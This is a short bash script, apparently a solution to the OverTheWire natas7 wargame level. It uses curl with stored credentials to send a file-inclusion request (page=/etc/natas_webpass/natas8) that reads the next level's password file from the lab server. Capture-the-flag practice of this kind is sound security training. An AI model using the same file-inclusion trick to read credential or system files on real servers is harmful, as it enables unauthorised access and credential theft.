#!/bin/bash

natas=natas7
key=$(< keys/sete)
uri="http://$natas.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
opts=""
filter=""

curl -u $natas:$key $opts $uri 2> /dev/null | grep -E "^[[:alpha:]].*"

